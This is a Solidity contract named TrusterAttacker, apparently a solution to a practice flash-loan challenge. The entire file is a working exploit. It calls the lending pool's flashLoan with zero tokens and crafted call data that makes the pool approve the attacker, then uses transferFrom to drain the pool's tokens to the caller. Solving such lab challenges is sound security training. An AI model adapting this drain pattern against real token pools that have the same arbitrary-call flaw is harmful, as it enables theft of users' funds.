pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "solmate/src/tokens/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract TrusterAttacker {
    function attackOnchain(
        address lender,
        uint256 hackAmount,
        address tokenAddress
        // bytes calldata data
    ) public {

        bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, address(this), hackAmount);
        console.logBytes(data);
        TrusterLenderPool(lender).flashLoan(
            0,
            address(this),
            tokenAddress,
            data
        );

        IERC20(tokenAddress).transferFrom(lender,msg.sender,hackAmount);
    }

    function attackOffchain(
        address lender,
        uint256 hackAmount,
        address tokenAddress,
        bytes calldata data
    ) public {

        TrusterLenderPool(lender).flashLoan(
            0,
            address(this),
            tokenAddress,
            data
        );
        
        IERC20(tokenAddress).transferFrom(lender,msg.sender,hackAmount);
    }
}
